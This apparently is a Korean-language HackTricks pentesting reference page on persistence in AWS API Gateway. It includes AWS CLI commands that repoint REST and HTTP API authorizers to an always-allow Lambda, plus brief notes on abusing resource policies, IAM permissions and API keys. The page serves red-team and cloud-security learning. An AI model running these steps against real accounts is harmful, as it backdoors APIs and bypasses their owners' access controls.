# AWS - API Gateway 지속성

{{#include ../../../../banners/hacktricks-training.md}}

## API Gateway

자세한 내용은 다음을 참조하세요:

{{#ref}}
../../aws-services/aws-api-gateway-enum.md
{{#endref}}

### Resource Policy

API gateway(s)의 리소스 정책을 수정하여 자신에게 접근 권한을 부여하세요.

### Modify Lambda Authorizers

lambda authorizers의 코드를 수정하여 모든 엔드포인트에 대한 접근을 자신에게 허용하세요.  
또는 단순히 authorizer 사용을 제거하세요.

컨트롤 플레인 권한으로 **authorizer를 생성/업데이트(create/update an authorizer)** 할 수 있다면 (REST API: `aws apigateway update-authorizer`, HTTP API: `aws apigatewayv2 update-authorizer`) **항상 허용하는 Lambda로 authorizer를 재지정(repoint)** 할 수도 있습니다.

REST APIs (변경 사항은 일반적으로 배포가 필요함):
```bash
REGION="us-east-1"
REST_API_ID="<rest_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigateway update-authorizer --region "$REGION" --rest-api-id "$REST_API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
aws apigateway create-deployment --region "$REGION" --rest-api-id "$REST_API_ID" --stage-name "<stage>"
```
HTTP API(들) / `apigatewayv2` (종종 즉시 적용됨):
```bash
REGION="us-east-1"
API_ID="<http_api_id>"
AUTHORIZER_ID="<authorizer_id>"
LAMBDA_ARN="arn:aws:lambda:$REGION:<account_id>:function:<always_allow_authorizer>"
AUTHORIZER_URI="arn:aws:apigateway:$REGION:lambda:path/2015-03-31/functions/$LAMBDA_ARN/invocations"

aws apigatewayv2 update-authorizer --region "$REGION" --api-id "$API_ID" --authorizer-id "$AUTHORIZER_ID" --authorizer-uri "$AUTHORIZER_URI"
```
### IAM Permissions

리소스가 IAM authorizer를 사용하고 있다면, IAM permissions을 수정해서 자신에게 접근 권한을 부여할 수 있습니다.\
또는 단순히 authorizer 사용을 제거할 수 있습니다.

### API Keys

API keys가 사용되고 있다면, persistence를 유지하기 위해 그것들을 leak하거나 새로 생성할 수 있습니다.\
또는 단순히 API keys의 사용을 제거할 수 있습니다.

{{#include ../../../../banners/hacktricks-training.md}}
